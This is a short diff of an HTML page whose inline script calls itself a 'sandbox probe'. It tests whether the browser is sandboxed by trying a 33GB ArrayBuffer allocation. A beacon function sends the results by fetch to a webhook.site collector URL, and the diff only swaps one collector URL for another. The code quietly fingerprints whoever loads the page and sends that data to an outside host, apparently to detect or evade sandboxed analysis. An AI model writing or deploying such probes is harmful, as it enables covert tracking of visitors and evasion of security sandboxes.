@@ -1,6 +1,6 @@
 <html><body><script>
 // sandbox probe: 33GB ArrayBuffer -> RangeError (sandboxed, 32GB cap) vs success (no sandbox)
-const SINK = 'https://webhook.site/17cfe592-ed97-4e13-8980-6daacc4312f1';
+const SINK = 'https://webhook.site/3a775582-4844-471d-817c-a3e67ae5ff30';
 function beacon(t, v){
   try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), {mode:'no-cors'}); } catch(e) {}
 }
